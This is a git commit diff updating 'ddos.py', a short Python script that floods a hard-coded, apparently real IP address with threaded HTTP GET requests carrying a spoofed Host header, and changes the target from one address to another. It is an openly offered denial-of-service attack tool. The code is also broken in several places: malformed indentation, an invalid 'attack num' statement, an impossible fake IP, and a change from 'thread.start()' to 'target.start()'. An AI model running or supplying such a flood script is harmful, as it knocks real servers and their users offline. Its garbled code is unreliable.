eea9004090191f70b8a6574ff09f931dbb55917a
Hamzzzzz <109900268+HamzBotzzzzz@users.noreply.github.com>
2025-01-17 20:18:16 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,7 +1,7 @@
 import socket
 import threading
 
-target = "103.163.138.104"
+target = "217.15.165.191"
 fake_ip = "277.15.165.199"
 port = 80
 
@@ -13,11 +13,11 @@ while True:
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.connect((target, port))
 
-soc.sendto(("GET /"+target+" HTTP/1.1\r\n")).encode("ascii"),
-           (target, port))
+soc.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"),
+(target, port))
 
-soc.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"), 
-           (target, port))
+soc.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),
+(target, port))
 
 global attack_num
 attack num += 1
@@ -28,4 +28,4 @@ soc.close()
 
 for i in range(10):
 thread = threading.Thread(target=attack)
-thread.start()
+target.start()
